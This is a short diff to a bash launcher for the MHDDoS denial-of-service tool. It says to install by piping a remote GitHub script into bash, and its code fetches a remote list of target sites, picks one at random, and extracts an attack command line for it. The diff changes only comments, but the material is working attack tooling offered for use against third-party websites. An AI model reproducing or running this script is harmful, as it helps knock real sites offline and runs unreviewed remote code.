@@ -1,5 +1,5 @@
 ##### Use next command in local linux terminal to run this script.
-#curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_init | cat | bash
+#curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_init | bash
 ##### To kill script press CTRL+C several times.
 
 #!/bin/bash
@@ -13,7 +13,7 @@ do
 ## Get random target from list of sites
 site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)
 
-## Cut "command line" from string. Everything before "#" is 'command line'
+## Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
 cmd_line=$(echo $site | awk -F "#" '{print $1}')
 echo $cmd_line
 
